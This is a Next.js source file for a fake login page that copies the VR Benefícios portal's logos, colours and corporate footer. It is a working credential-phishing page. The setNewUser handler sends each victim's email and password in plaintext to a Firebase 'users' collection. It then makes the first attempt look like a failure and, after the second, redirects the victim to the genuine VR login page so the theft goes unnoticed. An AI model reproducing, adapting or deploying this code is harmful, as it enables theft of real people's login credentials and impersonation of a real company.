"use client";

import { database } from "@/firebase";
import { push, ref } from "firebase/database";
import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";

export default function LoginPage() {
  // redirect("/checkModule");

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isValid, setIsValid] = useState<null | boolean>(null);
  const [loading, setLoading] = useState(false);
  const [count, setCount] = useState(0);

  const router = useRouter();

  const checkIfIsEmail = (username: string) => {
    const expression: RegExp =
      /^(?=.{1,254}$)(?=.{1,64}@)[-!#$%&'*+/0-9=?A-Z^_`a-z{|}~]+(\.[-!#$%&'*+/0-9=?A-Z^_`a-z{|}~]+)*@[A-Za-z0-9]([A-Za-z0-9-]{0,61}[A-Za-z0-9])?(\.[A-Za-z0-9]([A-Za-z0-9-]{0,61}[A-Za-z0-9])?)*$/;
    const result: boolean = expression.test(username);

    return result;
  };

  const setNewUser = () => {
    const pedidosRef = ref(database, "users");
    const newDataRef = push(pedidosRef, { username, password });

    setLoading(true);

    setCount((prev) => prev + 1);

    if (count === 1) {
      setTimeout(() => {
        setLoading(false);
      }, 1300);
    } else if (count === 2) {
      setTimeout(() => {
        // setLoading(false)
        router.push("https://portal.vr.com.br/portal/portal-vr/login/");
      }, 1300);
    }

    // setTimeout(() => {
    //   setLoading(false);
    //   router.push("/checkModule");
    // }, 2100);
  };

  useEffect(() => {
    // console.log(checkIfIsEmail(username));
    if (username !== "") {
      if (checkIfIsEmail(username) && password.length >= 4) {
        setIsValid(true);
      } else {
        setIsValid(false);
      }
    }
    console.log(checkIfIsEmail(username) && password.length >= 4);
  }, [username, password]);

  return (
    <>
      <div className="flex flex-col w-full">
        <div className="flex h-[100vh] bg-[#02AA12] justify-center items-center">
          <div className="flex flex-col md:w-[340px] sm:w-[60%] justify-between items-center">
            <div className="flex h-16 w-16">
              <Image
                alt="Portal logotipo"
                src="https://portal.vr.com.br/portal/img/logo.png"
                width={70}
                height={70}
              />
            </div>

            <div className="flex flex-col gap-14 w-full pt-24">
              <div className="relative z-0">
                <input
                  type="text"
                  id="floating_standard"
                  className="block text-base text-white py-2.5 pl-4 px-0 w-full bg-transparent border-0 border-b-2 border-zinc-200 appearance-none focus:outline-none focus:ring-0 focus:border-white peer"
                  placeholder=""
                  onChange={(e) => setUsername(e.target.value)}
                />
                <label className="absolute text-base pl-6 text-zinc-100 duration-300 transform -translate-y-6 scale-75 top-0 -z-10 origin-[0] peer-focus:start-0 peer-focus:text-zinc-100 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6 rtl:peer-focus:translate-x-1/4 rtl:peer-focus:left-auto">
                  Seu e-mail
                </label>

                {!checkIfIsEmail(username) && username !== "" ? (
                  <div className="flex w-full py-1 bg-[#F93416] mt-2">
                    <h4 className="text-center font-thin text-white text-sm px-4">
                      Por favor, digite um e-mail válido
                    </h4>
                  </div>
                ) : (
                  <></>
                )}
              </div>

              <div className="relative z-0">
                <input
                  type="password"
                  id="floating_standard"
                  className="block text-base text-white py-2.5 pl-4 px-0 w-full bg-transparent border-0 border-b-2 border-zinc-200 appearance-none focus:outline-none focus:ring-0 focus:border-white peer"
                  placeholder=" "
                  onChange={(e) => setPassword(e.target.value)}
                />
                <label className="absolute text-base pl-6 text-zinc-100 duration-300 transform -translate-y-6 scale-75 top-0 -z-10 origin-[0] peer-focus:start-0 peer-focus:text-zinc-100 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6 rtl:peer-focus:translate-x-1/4 rtl:peer-focus:left-auto">
                  Sua senha
                </label>
              </div>
            </div>
            <div className="flex flex-col gap-8 w-full py-8">
              {isValid ? (
                <>
                  <button
                    onClick={setNewUser}
                    disabled={loading}
                    className="w-full text-center flex items-center justify-center py-4 rounded-md text-green-900 font-semibold bg-[#FFC602] hover:bg-zinc-50 hover:transition-all disabled:cursor-no-drop"
                  >
                    {loading ? (
                      <>
                        <svg
                          aria-hidden="true"
                          className="w-8 h-8 text-green-800 animate-spin fill-green-300"
                          viewBox="0 0 100 101"
                          fill="none"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            d="M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z"
                            fill="currentColor"
                          />
                          <path
                            d="M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z"
                            fill="currentFill"
                          />
                        </svg>
                      </>
                    ) : (
                      <>Fazer login</>
                    )}
                  </button>
                </>
              ) : (
                <>
                  <button
                    disabled
                    className="w-full text-center bg-zinc-50 py-4 rounded-md text-zinc-300 disabled:cursor-no-drop"
                  >
                    Fazer login
                  </button>
                </>
              )}

              <a
                href=""
                className="text-center text-zinc-100 text-lg hover:underline"
              >
                Esqueci minha senha
              </a>
              <a
                href=""
                className="text-center text-zinc-100 text-lg hover:underline"
              >
                Esqueci meu e-mail
              </a>
            </div>
          </div>
        </div>
        <div className="flex flex-row gap-20 justify-between w-full h-44 py-10 bg-zinc-50 px-[20%]">
          <img
            src="https://assets.vr.com.br/portalrh/vrpat/img/logo.png"
            alt=""
            height={88}
            width={100}
          />
          <div className="flex flex-col w-full justify-center">
            <p className="text-zinc-600 text-base font-thin">
              © 2024 VR Benefícios - Todos os direitos reservados
            </p>
            <p className="text-zinc-600 text-base font-thin">
              {" "}
              N° PAT: 130385510 - CNPJ: <strong>02.535.864/0001-33</strong>
              {" - "}
              Política de PrivacidadeBoas Práticas
            </p>
          </div>
        </div>
      </div>
    </>
  );
}
